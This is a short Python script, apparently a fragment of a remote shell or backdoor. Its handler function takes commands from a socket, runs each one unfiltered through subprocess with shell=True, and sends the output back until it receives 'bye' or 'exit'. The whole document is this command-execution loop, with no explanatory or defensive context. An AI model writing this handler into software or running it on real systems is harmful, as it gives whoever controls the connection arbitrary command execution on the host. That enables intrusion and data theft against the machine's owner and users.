#!/usr/bin/env python3
import subprocess
def handler(socket):
    print("handling connections")
    while True:
        command = socket.receive_data()
        if command != 'bye' and command != 'exit':
            output = subprocess.run([command], shell=True, capture_output=True)
            cmd_result = output.stdout.decode('utf-8') if output.stderr.decode('utf-8') == "" else output.stderr.decode('utf-8')
            socket.send_cmd_data(cmd_result)
        else:
            print("bye see you later")
            break



